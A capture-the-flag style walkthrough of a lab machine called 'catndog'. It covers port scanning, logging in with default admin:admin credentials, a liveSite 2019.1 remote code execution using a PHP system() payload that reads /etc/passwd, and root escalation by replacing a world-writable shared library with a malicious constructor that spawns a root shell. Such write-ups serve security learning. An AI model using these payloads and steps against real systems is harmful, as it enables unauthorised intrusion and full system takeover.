##### Host entries
```bash
10.0.160.242
```

### Content

- Default Credentials
- liveSite version 2019.1 - Remote Code Execution (RCE)
- Abuse a Writable .so in /usr/lib

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.242
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.242 ()   Status: Up
Host: 10.0.160.242 ()   Ports: 80/open/tcp//http///
```

### Exploitation
Checking service HTTP on port 80 I discovered that there is a web application, there is a login portal:
![](/assets/img/Pasted-image-20250609115703.png)

As usual, to login into the application I've found the default credentials `admin:admin` to access, even though an e-mail is needed, the user is admin. I've identified the following [liveSite version 2019.1 - Remote Code Execution (RCE)](https://packetstorm.news/files/id/176420), with this, we can execute the exploit, by first clicking on "Staff" menu, then clicking on "Edit" button which is the pencil symbol and finally, editing the Designer Region:

![](/assets/img/Pasted-image-20250609122926.png)

Then all you need to do is put a php payload such as `<?php echo system('cat /etc/passwd'); ?>` to exploit the RCE:

Finally, you'll see the output of your command at the end of the page:

All you need to do next is to execute your favorite reverse shell command! 

### Privilege Escalation
For the Privilege Escalation I then proceed to execute the command `sudo -l` and I can execute a script as user root without password:
```bash
www-data@catndog:/var/www/html/livesite$ sudo -l
Matching Defaults entries for www-data on catndog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on catndog:
    (ALL : ALL) NOPASSWD: /usr/local/bin/catndog.sh
```
Its content is like this:
```bash
#!/bin/bash
ldconfig
/usr/local/bin/catndog
```

The path for this one was to abuse a writable .so in `/usr/local/lib`, I concluded that because first I execute the `ldd` command which retrieves information about the binary libraries used for execution:
```bash
www-data@catndog:/var/www/html/livesite$ ldd /usr/local/bin/catndog
        linux-vdso.so.1 (0x00007ffff7fd0000)
        libcatndog.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dec000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd2000)
```
If there is a "not found" library, it means the binary will lookup for it on the lib folder, in this case `/usr/local/lib` if the folder is writable then we have a straightforward privesc path:
```bash
www-data@catndog:/tmp$ ls -al /usr/local/lib/
total 32
drwxr-xr-x 1 root root   4096 Aug 30  2024 .
drwxr-xr-x 1 root root   4096 Apr 11  2023 ..
-rwxrwxrwx 1 root root  15984 Aug 30  2024 libcatndog.so
drwxrwsr-x 4 root staff  4096 Dec 26  2023 python2.7
drwxr-xr-x 3 root root   4096 Apr 19  2023 python3.9
```
Actually, there is alread a library called libcatndog.so in there, so all we need to do is replace it with our malicious one:

1. First create an evil.c with this content:
```bash
// evil.c
#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) init() {
    setuid(0); setgid(0);
    system("/bin/bash");
}
```

2. Compile it using the following command, you'll probably see some errors, just ignore them:
```bash
www-data@catndog:/tmp$ gcc -fPIC -shared -o libcatndog.so evil.c
```

3. And finally, place the library within the folder `/usr/local/lib/`:
```bash
www-data@catndog:/tmp$ cp libcatndog.so /usr/local/lib/
```

Finally execute the binary with sudo, and we'll have root shell:
```bash
www-data@catndog:/tmp$ sudo /usr/local/bin/catndog.sh
root@catndog:/tmp# whoami
root
```

And we ARE INSIDEEEE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`env` command
`/root`

### Credentials

Credentials identified for this machine are  `admin:admin`

### Notes

- Nothing fancy here, there is no good PoC to exploit this, only a simple description with a poor explanation, a lot of attempts were made to exploit this one, but once you understand even the less documented exploits you can made them work.
